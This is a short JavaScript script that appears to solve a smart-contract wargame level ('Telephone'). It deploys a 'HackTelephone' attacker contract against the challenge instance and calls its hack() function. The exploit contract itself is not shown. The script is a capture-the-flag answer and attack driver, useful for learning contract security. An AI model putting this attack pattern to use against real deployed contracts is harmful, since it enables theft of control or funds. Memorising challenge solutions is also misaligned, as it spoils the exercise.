const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    let attacker = loader.web3.fromArtifact('HackTelephone')
    console.log('Deploy attacker contract...')
    const { options: { address } } = await attacker.deploy({ arguments: [instance] }).send()
    attacker = loader.web3.fromArtifact('HackTelephone', address)
    console.log('Call hack() function of attacker contract...')
    await attacker.methods.hack().send()
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
